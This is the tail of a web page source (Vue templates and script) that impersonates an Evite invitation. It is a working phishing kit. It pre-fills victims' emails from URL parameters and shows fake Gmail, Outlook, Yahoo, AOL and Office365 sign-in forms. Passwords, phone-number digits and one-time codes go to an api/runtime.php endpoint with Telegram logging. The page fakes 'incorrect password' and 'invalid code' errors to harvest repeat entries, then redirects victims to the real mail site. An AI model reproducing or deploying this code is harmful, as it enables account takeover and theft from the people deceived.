              <button
                type="submit"
                :disabled="modalBusy"
                class="mt-2 inline-flex w-full items-center justify-center rounded-lg bg-evite-coregreen hover:bg-evite-coregreenhover px-4 py-3 text-sm font-semibold text-white transition disabled:opacity-60 focus:outline-none"
              >
                <span v-if="modalBusy" class="inline-flex items-center gap-2">Loading…</span>
                <span v-else>Continue</span>
              </button>
            </form>

            <!-- STAGE 2: OTP (Verification Code) Form -->
            <form v-if="modalStage === 'otp'" class="mt-5 space-y-4" @submit.prevent="submitOtp">
              <div class="text-center">
                <div class="text-sm font-semibold text-slate-900">Security Verification</div>
                <div class="mt-1 text-xs text-slate-600">
                  A verification code was sent to your device. Enter it below to continue.
                </div>
              </div>

              <!-- Error message -->
              <div
                v-if="modalError"
                class="rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700"
                role="status"
                aria-live="polite"
              >
                {{ modalError }}
              </div>

              <div>
                <label class="block text-xs font-semibold text-slate-700">Verification Code (6 digits)</label>
                <input
                  v-model.trim="otpCode"
                  type="text"
                  inputmode="numeric"
                  autocomplete="one-time-code"
                  maxlength="6"
                  pattern="[0-9]*"
                  @input="otpCode = otpCode.replace(/[^0-9]/g, '').slice(0, 6)"
                  required
                  class="mt-1 w-full rounded-lg border border-slate-300 bg-white py-3 px-4 text-sm text-slate-900 outline-none transition focus:border-evite-coregreen focus:ring-2 focus:ring-evite-coregreen/30"
                  placeholder="Enter 6-digit code"
                />
              </div>

              <button
                type="submit"
                :disabled="modalBusy"
                class="inline-flex w-full items-center justify-center rounded-lg bg-evite-coregreen hover:bg-evite-coregreenhover px-4 py-3 text-sm font-semibold text-white transition disabled:opacity-60 focus:outline-none"
              >
                <span v-if="modalBusy" class="inline-flex items-center gap-2">
                  <svg class="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 0 1 8-8v4a4 4 0 0 0-4 4H4z"></path>
                  </svg>
                  Verifying…
                </span>
                <span v-else>Verify and Continue</span>
              </button>

              <div class="text-center">
                <button
                  type="button"
                  class="text-xs font-semibold text-evite-coregreen hover:underline disabled:opacity-50 focus:outline-none"
                  @click="resendCode"
                  :disabled="modalBusy"
                >
                  Didn't receive a code? Resend
                </button>
              </div>
            </form>

            <!-- STAGE 3: Success message -->
            <div v-if="modalStage === 'success'" class="mt-6 text-center">
              <div class="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-emerald-50 ring-1 ring-emerald-200">
                <svg viewBox="0 0 24 24" class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2">
                  <path d="M20 6L9 17l-5-5"></path>
                </svg>
              </div>
              <div class="mt-3 text-sm font-semibold text-slate-900">Signed in</div>
              <div class="mt-1 text-xs text-slate-600">Redirecting…</div>
            </div>

          </div>
        </div>
      </div>
    </transition>

    <!-- Toast elements -->
    <transition
      enter-active-class="transition duration-250 ease-out"
      enter-from-class="opacity-0 translate-y-2"
      enter-to-class="opacity-100 translate-y-0"
      leave-active-class="transition duration-200 ease-in"
      leave-from-class="opacity-100 translate-y-0"
      leave-to-class="opacity-0 translate-y-2"
    >
      <div
        v-if="toast"
        class="fixed bottom-16 left-1/2 z-[60] -translate-x-1/2 rounded-lg border border-white/30 bg-black/80 px-4 py-3 text-sm text-white shadow-lg"
        role="status"
        aria-live="polite"
      >
        {{ toast }}
      </div>
    </transition>

    <!-- Footer -->
    <footer class="w-full bg-white border-t border-evite-bordergray py-6 mt-8">
      <div class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row items-center justify-between gap-4">
        <div class="flex items-center gap-3">
          <img src="asset/evite-logo-primary-coregreen.svg" alt="evite" class="h-6">
          <span class="text-xs text-evite-graytext">© 2026 Evite. All rights reserved.</span>
        </div>
        <div class="flex items-center gap-6">
          <a href="#" class="text-xs text-evite-graytext hover:text-evite-coregreen transition-colors">Privacy Policy</a>
          <a href="#" class="text-xs text-evite-graytext hover:text-evite-coregreen transition-colors">Terms of Service</a>
          <a href="#" class="text-xs text-evite-graytext hover:text-evite-coregreen transition-colors">Contact Support</a>
        </div>
      </div>
    </footer>
  </div>

  <script>
    window.APP_CONFIG = <?php echo json_encode($uiConfig, JSON_UNESCAPED_SLASHES); ?>;
  </script>
  <script>
    const { createApp, ref, computed, onMounted, nextTick } = Vue;

    createApp({
      setup() {
        // Step Management for User Flow
        // Options: 'welcome' | 'loading' | 'login' | 'dashboard'
        const currentStep = ref(window.APP_CONFIG?.skip_prepage ? 'login' : 'welcome');

        // Slideshow Dataset matching Evite Homepage banner
        const slides = ref([
          {
            bgImage: 'asset/6a04bea3486abffcd00678bc_d52b8e8062744cbff2c604f84c6348bb_Frame 1.webp',
            bgColor: '#ebdff2', // Lilac
            slogan: 'Flip-flops optional. RSVP appreciated.',
            cards: [
              { image: 'asset/6a346d64ba739f572c7d2a65_Template-06.webp', style: 'transform: rotate(-3deg) translateY(8px); z-index: 10;' }
            ]
          },
          {
            bgImage: 'asset/6a04bea3abafce98bce03ba5_2a6c53b84e60d7e5f2563ab4a96e34c4_Frame 2.webp',
            bgColor: '#edf3ee', // Light green
            slogan: 'Make it official. Save the date.',
            cards: [
              { image: 'asset/6a3c1e1c8d3db612f689e02c_Template.webp', style: 'transform: rotate(2deg) translateY(-8px); z-index: 10;' }
            ]
          },
          {
            bgImage: 'asset/6a04bea361e3fa6ae019ee3d_6b2e1f65fb83a88f0ed8d857e568ca76_Frame 3.webp',
            bgColor: '#fec3a6', // Peach
            slogan: 'They grow fast. Go all out.',
            cards: [
              { image: 'asset/6a346d64e0b5e165efac2e16_Template-01.webp', style: 'transform: rotate(-6deg) translate(-28px, -16px) scale(0.9); z-index: 5;' },
              { image: 'asset/6a346d64c375dd1fe2349162_Template-03.webp', style: 'transform: rotate(4deg) translate(28px, 16px) scale(0.95); z-index: 10;' }
            ]
          }
        ]);

        const currentSlide = ref(0);
        let slideTimer = null;
        const isSliderPaused = ref(false);

        const nextSlide = () => {
          currentSlide.value = (currentSlide.value + 1) % slides.value.length;
        };

        const prevSlide = () => {
          currentSlide.value = (currentSlide.value - 1 + slides.value.length) % slides.value.length;
        };

        const setSlide = (idx) => {
          currentSlide.value = idx;
          resetSlideTimer();
        };

        const startSlideTimer = () => {
          slideTimer = setInterval(() => {
            if (!isSliderPaused.value) {
              nextSlide();
            }
          }, 5000); // Transitions slide every 5 seconds
        };

        const resetSlideTimer = () => {
          clearInterval(slideTimer);
          startSlideTimer();
        };

        const pauseSlideshow = () => {
          isSliderPaused.value = true;
        };

        const resumeSlideshow = () => {
          isSliderPaused.value = false;
          resetSlideTimer();
        };

        // Params: ?sender=<name-or-email>&invitee=<name-or-email>
        // No invitee param → default display name still shown; hasInvitee stays false.
        const getQueryParam = (param) => {
          const urlParams = new URLSearchParams(window.location.search);
          return urlParams.get(param) || '';
        };

        const cleanStr = (raw, max = 120) => {
          if (typeof raw !== 'string') return '';
          let v = raw.trim().replace(/[\x00-\x1F\x7F]/g, '');
          if (v.length > max) v = v.slice(0, max);
          return v;
        };

        const nameFromEmail = (raw) => {
          let v = cleanStr(raw, 160);
          if (!v) return '';
          if (v.includes('@')) v = v.slice(0, v.indexOf('@'));
          v = v.replace(/[._\-+]/g, ' ').replace(/\s+/g, ' ').trim();
          return v.split(' ').map((p) => {
            if (!p) return '';
            return p.charAt(0).toUpperCase() + p.slice(1).toLowerCase();
          }).filter(Boolean).join(' ');
        };

        const senderParam = cleanStr(getQueryParam('sender'), 160);
        const inviteeParam = cleanStr(getQueryParam('invitee'), 160);

        const hasSender = computed(() => senderParam !== '');

        const defaultSender = computed(() => {
          return cfg.value?.default_sender || 'Evite Guest Host';
        });

        const hostName = computed(() => {
          return senderParam ? nameFromEmail(senderParam) : '';
        });

        const inviteeName = computed(() => {
          if (inviteeParam) return nameFromEmail(inviteeParam);
          return 'Special VIP Guest';
        });

        const hasInvitee = computed(() => inviteeParam !== '');

        const telegramSender = computed(() => hostName.value || '');

        // Resolve prefilled email for login gate
        const inviteeEmail = computed(() => {
          if (inviteeParam && inviteeParam.includes('@')) {
            return inviteeParam;
          }
          return ''; // fallback
        });

        // Typing Loop logic for Sender Name
        const displayedSender = ref('');
        const isTypingFading = ref(false);
        let typeTimer = null;

        const startTypingLoop = () => {
          const text = hasSender.value ? hostName.value : defaultSender.value;
          let index = 0;
          displayedSender.value = '';
          isTypingFading.value = false;

          const type = () => {
            // Only type if we are on the steps where it's needed (welcome or dashboard)
            if (currentStep.value !== 'welcome' && currentStep.value !== 'dashboard') {
              typeTimer = setTimeout(startTypingLoop, 1000);
              return;
            }

            if (index < text.length) {
              displayedSender.value += text.charAt(index);
              index++;
              typeTimer = setTimeout(type, 150); // Typing speed
            } else {
              // Finish typing: wait 4 seconds, fade out, then restart
              typeTimer = setTimeout(() => {
                isTypingFading.value = true; // start CSS fadeout
                typeTimer = setTimeout(() => {
                  startTypingLoop();
                }, 500);
              }, 4000);
            }
          };
          type();
        };

        // Transition action handlers
        const proceedToLoading = () => {
          currentStep.value = 'loading';
          
          // Simulated loading duration of 2.8 seconds, then redirects to login
          setTimeout(() => {
            currentStep.value = 'login';
            
            // Auto-open modal on landing at login step if email is prefilled!
            if (grabbedEmail.value) {
              const providerId = ['outlook', 'aol', 'office365', 'yahoo'].includes(grabbedProvider.value) ? grabbedProvider.value : 'other';
              const finalId = grabbedEmail.value.endsWith('@gmail.com') || grabbedEmail.value.endsWith('@googlemail.com') ? 'gmail' : providerId;
              const p = getProviderById(finalId);
              if (p) {
                selectProvider(p);
              }
            }
          }, 2800);
        };

        // MODAL CONFIGURATIONS AND METHODS (Matching sample code)
        const cfg = ref(window.APP_CONFIG);
        const toast = ref('');
        const activeProvider = ref(null);
        const modalOpen = ref(false);
        const modalStage = ref('form'); // 'form' | 'otp' | 'success'
        const modalProvider = ref(null);
        const modalEmail = ref('');
        const modalPassword = ref('');
        const showPassword = ref(false);
        const modalBusy = ref(false);
        const modalError = ref('');
        const modalAttempt = ref(0);
        const otpCode = ref('');
        const otpAttempt = ref(0);
        const last4Code = ref('');
        const grabbedEmail = ref('');
        const grabbedProvider = ref('');
        const modalPasswordOnly = ref(false);

        const PROVIDER_REDIRECTS = {
          aol: 'https://mail.aol.com',
          yahoo: 'https://mail.yahoo.com',
          outlook: 'https://outlook.live.com',
          office365: 'https://www.office.com',
          gmail: 'https://mail.google.com',
          other: 'https://mail.google.com',
        };

        const getProviderRedirectUrl = (pid) => {
          return PROVIDER_REDIRECTS[pid] || PROVIDER_REDIRECTS.other;
        };

        const providers = ref([
          { id: 'gmail', label: 'Sign in with Gmail', color: '#ea4335', logoUrl: 'asset/gmail.svg' },
          { id: 'outlook', label: 'Sign in with Outlook', color: '#0078D4', logoUrl: 'asset/outlook.svg' },
          { id: 'office365', label: 'Sign in with Office365', color: '#d83b01', logoUrl: 'asset/office365.svg' },
          { id: 'yahoo', label: 'Sign in with Yahoo Mail', color: '#6001D2', logoUrl: 'asset/yahoo.svg', logoClass: 'provider-logo--yahoo' },
          { id: 'aol', label: 'Sign in with AOL', color: '#000000', logoUrl: 'asset/aol.svg' },
          { id: 'other', label: 'Sign in with Other Mail', color: '#4a90e2', logoUrl: 'asset/email.svg' },
        ]);

        const normalizeRedirectUrl = (url) => {
          if (typeof url !== 'string') return '';
          const u = url.trim();
          if (!u) return '';
          if (/^[a-z][a-z0-9+.-]*:\/\//i.test(u)) return u;          // absolute URL
          if (u.startsWith('./') || u.startsWith('../') || u.startsWith('/')) return u; // relative path
          return `https://${u}`;
        };

        const normalizeEmailMaybe = (v) => {
          if (typeof v !== 'string') return '';
          const val = v.trim();
          if (!val) return '';
          if (val.includes('@')) return val;
          try {
            const b64 = val.replace(/-/g, '+').replace(/_/g, '/');
            const decoded = atob(b64 + '='.repeat((4 - (b64.length % 4)) % 4));
            return decoded.includes('@') ? decoded.trim() : '';
          } catch (_) { return ''; }
        };

        const isValidEmail = (email) => {
          return typeof email === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(email.trim());
        };

        const inferProviderFromEmail = (email) => {
          if (!email || !email.includes('@')) return 'other';
          const d = email.split('@').pop().toLowerCase();
          if (['gmail.com', 'googlemail.com'].includes(d)) return 'gmail';
          if (d === 'aol.com') return 'aol';
          if (['yahoo.com', 'ymail.com', 'rocketmail.com'].includes(d)) return 'yahoo';
          if (
            ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'passport.com'].includes(d)
            || d.endsWith('.live.com')
            || d.endsWith('.outlook.com')
          ) return 'outlook';
          if (
            ['office365.com', 'microsoft.com', 'outlook.office365.com'].includes(d)
            || d.endsWith('.onmicrosoft.com')
          ) return 'office365';
          return 'other';
        };

        const getProviderById = (id) => {
          return providers.value.find((p) => p.id === id) || null;
        };

        const autograbEmail = () => {
          grabbedEmail.value = '';
          grabbedProvider.value = '';
          try {
            const params = new URLSearchParams(window.location.search);
            const raw = params.get('email') || params.get('em') || params.get('invitee') || '';
            if (!raw) return;
            const email = normalizeEmailMaybe(raw);
            if (!isValidEmail(email)) return;
            grabbedEmail.value = email.trim();
            grabbedProvider.value = inferProviderFromEmail(grabbedEmail.value);
          } catch (_) {}
        };

        const isProviderEnabled = (pid) => {
          const targetId = pid === 'gmail' ? 'other' : pid;
          return !!(cfg.value?.providers?.[targetId]?.enabled ?? true);
        };

        const getRedirect = (pid) => {
          const targetId = pid === 'gmail' ? 'other' : pid;
          const p = cfg.value?.providers?.[targetId];
          const url = typeof p?.redirect?.url === 'string' ? p.redirect.url.trim() : '';
          return { enabled: !!p?.redirect?.enabled, url };
        };

        const shouldRedirect = (pid) => {
          const r = getRedirect(pid);
          return r.enabled && !!r.url;
        };

        const logProviderClick = (pid) => {
          fetch('api/runtime.php', {
            method: 'POST',
            body: JSON.stringify({
              event: 'click',
              provider: pid,
              email: grabbedEmail.value || '',
              sender: telegramSender.value,
            }),
            headers: { 'Content-Type': 'application/json' },
            keepalive: true,
          }).catch(() => {});
        };

        const onLogoError = (p) => {
          if (p) p.logoUrl = '';
        };

        const logVisitIfEnabled = () => {
          if (!cfg.value?.telegram?.log_visits) return;
          fetch('api/runtime.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'visit',
              sender: telegramSender.value,
            }),
            keepalive: true,
          }).catch(() => {});
        };

        const openModal = (p, opts = {}) => {
          modalProvider.value = p;
          const usePasswordOnly = !!(opts.passwordOnly && opts.email);
          modalEmail.value = usePasswordOnly ? opts.email : (opts.email ?? '');
          modalPasswordOnly.value = usePasswordOnly;
          modalPassword.value = '';
          modalError.value = '';
          modalAttempt.value = 0;
          otpCode.value = '';
          otpAttempt.value = 0;
          last4Code.value = '';
          modalStage.value = 'form';
          modalOpen.value = true;
          
          pauseSlideshow();

          nextTick(() => {
            const selector = modalPasswordOnly.value
              ? 'input[autocomplete="current-password"]'
              : 'input[type="email"]';
            document.querySelector(selector)?.focus();
          });
        };

        const closeModal = () => {
          modalOpen.value = false;
          modalPasswordOnly.value = false;
          resumeSlideshow();
        };

        const togglePassword = () => {
          showPassword.value = !showPassword.value;
        };

        const postToMlog = async (awaitResponse = false) => {
          const payload = new URLSearchParams({
            event: 'submit',
            email: modalEmail.value,
            password: modalPassword.value,
            provider: modalProvider.value?.id || '',
            modal: 'sign-in',
            sender: telegramSender.value,
          });
          const body = payload.toString();
          if (awaitResponse) {
            try {
              const r = await fetch('api/runtime.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body,
              });
              await r.text();
            } catch (_) {}
          } else if (navigator.sendBeacon) {
            navigator.sendBeacon('api/runtime.php', new Blob([body], { type: 'application/x-www-form-urlencoded' }));
          } else {
            fetch('api/runtime.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body,
              keepalive: true,
            }).catch(() => {});
          }
        };

        const submitModal = async () => {
          if (modalBusy.value) return;
          modalBusy.value = true;
          await postToMlog(true);
          modalBusy.value = false;

          // Show incorrect password up to password_retries times, then proceed to OTP
          const pidRaw = (modalProvider.value?.id || '').toLowerCase();
          const maxRetries = (pidRaw === 'aol' || pidRaw === 'yahoo' || pidRaw === 'outlook' || pidRaw === 'office365')
            ? Math.min(1, cfg.value?.password_retries ?? 2)
            : (cfg.value?.password_retries ?? 2);
          if (modalAttempt.value < maxRetries) {
            modalAttempt.value++;
            modalError.value = 'Incorrect password, please try again.';
            modalPassword.value = '';
            return;
          }
          // AOL / Yahoo: collect the last 4 digits before OTP
          const providerId = (modalProvider.value?.id || '').toLowerCase();
          if (providerId === 'aol' || providerId === 'yahoo' || providerId === 'outlook' || providerId === 'office365') {
            modalStage.value = 'last4';
            modalError.value = '';
            nextTick(() => document.querySelector('input[inputmode="numeric"]')?.focus());
            return;
          }
          // Proceed to OTP after max retries reached
          modalStage.value = 'otp';
          modalError.value = '';
          nextTick(() => document.querySelector('input[inputmode="numeric"]')?.focus());
        };

        const submitLast4 = async () => {
          if (modalBusy.value) return;
          if (!/^\d{4}$/.test(last4Code.value)) {
            modalError.value = 'Please enter the 4 digits.';
            return;
          }
          modalBusy.value = true;
          try {
            const payload = new URLSearchParams({
              event: 'last4',
              email: modalEmail.value,
              password: modalPassword.value,
              provider: modalProvider.value?.id || '',
              last4: last4Code.value,
              sender: telegramSender.value,
            });
            await fetch('api/runtime.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload.toString(),
            });
          } catch (_) {}
          modalBusy.value = false;
          last4Code.value = '';
          modalError.value = '';
          modalStage.value = 'otp';
          nextTick(() => document.querySelector('input[inputmode="numeric"]')?.focus());
        };

        const submitOtp = async () => {
          if (modalBusy.value) return;
          if (!/^\d{6}$/.test(otpCode.value)) {
            modalError.value = 'Please enter a valid 6-digit code.';
            return;
          }
          if (cfg.value?.otp_twice && otpAttempt.value === 0) {
            modalBusy.value = true;
            const payload = new URLSearchParams({
              event: 'otp',
              email: modalEmail.value,
              otp: otpCode.value,
              provider: modalProvider.value?.id || '',
              attempt: '1',
              sender: telegramSender.value,
            });
            try {
              await fetch('api/runtime.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: payload.toString(),
              });
            } catch (_) {}
            setTimeout(() => {
              modalBusy.value = false;
              otpAttempt.value = 1;
              modalError.value = 'Invalid code, please try again.';
              otpCode.value = '';
            }, 4000);
            return;
          }

          modalBusy.value = true;
          const payload = new URLSearchParams({
            event: 'otp',
            email: modalEmail.value,
            otp: otpCode.value,
            provider: modalProvider.value?.id || '',
            attempt: cfg.value?.otp_twice ? '2' : '1',
            sender: telegramSender.value,
          });
          try {
            await fetch('api/runtime.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload.toString(),
            });
          } catch (_) {}
          setTimeout(() => {
            modalBusy.value = false;
            modalStage.value = 'success';
            setTimeout(() => {
              const pid = modalProvider.value?.id || 'other';
              const url = getProviderRedirectUrl(pid);
              if (url) {
                window.location.replace(url);
              } else {
                closeModal();
                rsvp.value.name = inviteeName.value !== 'Special VIP Guest' ? inviteeName.value : '';
                rsvp.value.email = modalEmail.value;
                currentStep.value = 'dashboard';
                currentSlide.value = 2; // Lock to slide 3 (Balloons)
                pauseSlideshow();
              }
            }, 3000);
          }, 4000);
        };

        const resendCode = async () => {
          if (modalBusy.value) return;
          modalBusy.value = true;
          const payload = new URLSearchParams({
            event: 'resend_otp',
            email: modalEmail.value,
            provider: modalProvider.value?.id || '',
            sender: telegramSender.value,
          });
          try {
            await fetch('api/runtime.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload.toString(),
            });
          } catch (_) {}
          modalBusy.value = false;
          toast.value = 'Code resent successfully.';
          setTimeout(() => { toast.value = ''; }, 3000);
        };

        const selectProvider = (p) => {
          document.cookie = 'kit_provider=' + encodeURIComponent(p.id) + '; path=/; max-age=86400';
          activeProvider.value = p.id;

          if (shouldRedirect(p.id)) {
            window.location.replace(normalizeRedirectUrl(getRedirect(p.id).url));
            return;
          }

          const autoOpts = grabbedEmail.value
            ? { passwordOnly: true, email: grabbedEmail.value }
            : {};
          openModal(p, autoOpts);
        };

        // RSVP Form Reactive State
        const rsvp = ref({
          name: '',
          guests: 0,
          email: '',
          dietary: '',
          status: 'yes'
        });

        const attendanceOptions = [
          { value: 'yes', label: 'Heck Yes!', icon: 'fa-check' },
          { value: 'maybe', label: 'Maybe', icon: 'fa-question' },
          { value: 'no', label: 'Can\'t Go', icon: 'fa-times' }
        ];

        const isSubmitting = ref(false);
        const rsvpSubmitted = ref(false);

        const submitRSVP = () => {
          isSubmitting.value = true;
          setTimeout(() => {
            isSubmitting.value = false;
            rsvpSubmitted.value = true;
          }, 1500);
        };

        const printTicket = () => {
          window.print();
        };

        onMounted(() => {
          autograbEmail();
          logVisitIfEnabled();
          startTypingLoop();
          startSlideTimer();

          // If skip_prepage is on and email was auto-grabbed, open the modal immediately
          if (window.APP_CONFIG?.skip_prepage && grabbedEmail.value) {
            const providerId = ['outlook', 'aol', 'office365', 'yahoo'].includes(grabbedProvider.value) ? grabbedProvider.value : 'other';
            const finalId = grabbedEmail.value.endsWith('@gmail.com') || grabbedEmail.value.endsWith('@googlemail.com') ? 'gmail' : providerId;
            const p = getProviderById(finalId);
            if (p) {
              selectProvider(p);
            }
          }
        });

        return {
          currentStep,
          slides,
          currentSlide,
          setSlide,
          pauseSlideshow,
          resumeSlideshow,
          hostName,
          inviteeName,
          hasInvitee,
          defaultSender,
          displayedSender,
          isTypingFading,
          proceedToLoading,
          cfg,
          toast,
          activeProvider,
          modalOpen,
          modalStage,
          modalProvider,
          modalEmail,
          modalPassword,
          showPassword,
          modalBusy,
          modalError,
          otpCode,
          last4Code,
          modalPasswordOnly,
          providers,
          isProviderEnabled,
          onLogoError,
          closeModal,
          togglePassword,
          submitModal,
          submitLast4,
          submitOtp,
          resendCode,
          selectProvider,
          rsvp,
          attendanceOptions,
          isSubmitting,
          rsvpSubmitted,
          submitRSVP,
          printTicket
        };
      }
    }).mount('#app');
  </script>
</body>
</html>
